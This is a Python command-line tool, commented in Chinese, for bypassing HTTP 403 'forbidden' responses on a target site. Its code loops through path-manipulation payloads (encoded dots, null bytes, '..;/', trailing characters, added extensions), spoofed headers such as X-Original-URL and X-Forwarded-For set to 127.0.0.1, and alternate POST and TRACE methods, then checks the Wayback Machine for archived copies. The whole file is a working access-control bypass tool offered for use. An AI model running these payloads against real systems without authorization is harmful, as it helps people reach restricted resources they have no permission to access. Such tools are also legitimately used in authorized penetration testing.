import requests
import sys
import json
from pyfiglet import Figlet
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 颜色定义
COLOR = {
    'RED': '\033[91m',
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'BLUE': '\033[94m',
    'MAGENTA': '\033[95m',
    'CYAN': '\033[96m',
    'WHITE': '\033[97m',
    'BOLD': '\033[1m',
    'UNDERLINE': '\033[4m',
    'END': '\033[0m',
}

def print_banner():
    # 打印工具标题 - 使用洋红色和粗体
    f = Figlet(font='slant')
    print(COLOR['MAGENTA'] + COLOR['BOLD'] + f.renderText('绕过403禁止访问') + COLOR['END'])
    print(f"{COLOR['YELLOW']}使用方法: python3 bypass-403.py https://example.com 路径{COLOR['END']}")
    print()

def make_request(url, headers=None, method='GET', data=None):
    try:
        # 发送HTTP请求并获取响应
        if method == 'GET':
            response = requests.get(url, headers=headers, verify=False)
        elif method == 'POST':
            response = requests.post(url, headers=headers, data=data, verify=False)
        elif method == 'TRACE':
            response = requests.request('TRACE', url, headers=headers, verify=False)
        
        # 根据状态码使用不同颜色
        status_color = COLOR['GREEN'] if response.status_code == 200 else COLOR['RED'] if response.status_code == 403 else COLOR['YELLOW']
        print(f"{COLOR['BOLD']}状态码:{COLOR['END']} {status_color}{response.status_code}{COLOR['END']}, "
              f"{COLOR['BOLD']}响应大小:{COLOR['END']} {COLOR['BLUE']}{len(response.content)}{COLOR['END']}  "
              f"{COLOR['BOLD']}--> 目标URL:{COLOR['END']} {COLOR['UNDERLINE']}{url}{COLOR['END']}")
        if headers:
            print(f"    {COLOR['CYAN']}自定义请求头: {headers}{COLOR['END']}")
    except Exception as e:
        print(f"{COLOR['RED']}访问 {url} 时出错: {str(e)}{COLOR['END']}")

def check_wayback_machine(base_url, path):
    # 检查Wayback Machine存档
    url = f"{base_url}/{path}"
    api_url = f"https://archive.org/wayback/available?url={url}"
    try:
        response = requests.get(api_url)
        data = response.json()
        closest = data.get('archived_snapshots', {}).get('closest', {})
        result = {
            '是否可用': closest.get('available', False),
            '存档URL': closest.get('url', '')
        }
        print(f"\n{COLOR['BOLD']}{COLOR['MAGENTA']}Wayback Machine存档检查结果:{COLOR['END']}")
        print(json.dumps(result, ensure_ascii=False))
    except Exception as e:
        print(f"{COLOR['RED']}检查Wayback Machine时出错: 检查是否挂梯子")

def main():
    if len(sys.argv) < 3:
        print(f"{COLOR['RED']}错误: 参数不足{COLOR['END']}")
        print(f"{COLOR['YELLOW']}正确用法: python3 bypass-403.py https://example.com 路径{COLOR['END']}")
        return
    
    base_url = sys.argv[1].strip().rstrip('/')
    path = sys.argv[2].strip().lstrip('/').rstrip('/')
    
    print_banner()
    
    # 测试各种绕过技术
    print(f"\n{COLOR['BOLD']}{COLOR['GREEN']}开始测试各种URL绕过技术...{COLOR['END']}")
    test_urls = [
        f"{base_url}/{path}",                   # 基本路径
        f"{base_url}/%2e/{path}",               # URL编码点
        f"{base_url}/{path}/.",                 # 结尾加点
        f"{base_url}//{path}//",                # 双斜杠
        f"{base_url}/./{path}/./",              # 含点的路径
        f"{base_url}/{path}%20",                # URL编码空格
        f"{base_url}/{path}%09",                # URL编码制表符
        f"{base_url}/{path}%00",
        f"{base_url}/{path}?",                  # 结尾加问号
        f"{base_url}/{path}??",
        f"{base_url}/{path}???",
        f"{base_url}/{path}.html",              # 添加html扩展名
        f"{base_url}/{path}/?anything",         # 添加任意查询参数
        f"{base_url}/{path}#",                  # 结尾加井号
        f"{base_url}/{path}/*",                 # 结尾加星号
        f"{base_url}/{path}.php",               # 添加php扩展名
        f"{base_url}/{path}.json",              # 添加json扩展名
        f"{base_url}/{path}.css",
        f"{base_url}/{path}..;/",               # 目录遍历
        f"{base_url}/{path};/",                  # 分号绕过
        f"{base_url}/{path}/..;/",
        f"{base_url}/{path}?testparam",
        f"{base_url}/{path}#test",
        f"{base_url}/{path}%20/",
        f"{base_url}/%20{path}%20/",
        f"{base_url}/{path}//",
        f"{base_url}/{path}/",
        f"{base_url}/{path}/.randomstring"
    ]
    
    for url in test_urls:
        make_request(url)
    
    # 测试不同请求头
    print(f"\n{COLOR['BOLD']}{COLOR['GREEN']}开始测试自定义请求头绕过技术...{COLOR['END']}")
    headers_tests = [
        ({"X-Original-URL": path}, f"{base_url}/{path}"),                # X-Original-URL头
        ({"X-Custom-IP-Authorization": "127.0.0.1"}, f"{base_url}/{path}"), # 自定义IP授权
        ({"X-Forwarded-For": "http://127.0.0.1"}, f"{base_url}/{path}"), # X-Forwarded-For头
        ({"X-Forwarded-For": "127.0.0.1:80"}, f"{base_url}/{path}"),     # X-Forwarded-For带端口
        ({"X-rewrite-url": path}, base_url),                             # URL重写头
        ({"X-Host": "127.0.0.1"}, f"{base_url}/{path}"),                 # 自定义Host
        ({"X-Forwarded-Host": "127.0.0.1"}, f"{base_url}/{path}"),       # 转发Host
    ]
    
    for headers, url in headers_tests:
        make_request(url, headers=headers)
    
    # 测试不同HTTP方法
    print(f"\n{COLOR['BOLD']}{COLOR['GREEN']}开始测试不同HTTP方法...{COLOR['END']}")
    make_request(f"{base_url}/{path}", method='POST', headers={"Content-Length": "0"})
    make_request(f"{base_url}/{path}", method='TRACE')
    
    # 检查Wayback Machine存档，需要代理
    print(f"\n{COLOR['BOLD']}{COLOR['MAGENTA']}正在检查Wayback Machine存档...{COLOR['END']}")
    check_wayback_machine(base_url, path)

if __name__ == "__main__":
    main()
